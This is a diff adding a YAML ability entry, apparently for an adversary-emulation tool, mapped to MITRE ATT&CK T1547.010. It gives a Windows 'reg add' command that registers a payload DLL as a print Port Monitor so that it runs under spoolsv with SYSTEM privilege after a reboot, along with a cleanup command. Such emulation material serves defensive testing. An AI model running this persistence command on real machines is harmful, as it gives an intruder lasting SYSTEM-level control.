@@ -1,0 +1,18 @@
+---
+- id: cdd07ec8e213c18255b123e4a997db7c
+  name: Add Port Monitor persistence in Registry
+  description: Add key-value pair to a Windows Port Monitor registry. On the subsequent
+    reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.
+  tactic: multiple
+  technique:
+    attack_id: T1547.010
+    name: 'Boot or Logon Autostart Execution: Port Monitors'
+  platforms:
+    windows:
+      cmd:
+        command: reg add "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"
+          /v "Driver" /d "dba276_PortMonitor.dll" /t REG_SZ /f
+        payloads:
+        - dba276_PortMonitor.dll
+        cleanup: reg delete "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"
+          /f >nul 2>&1
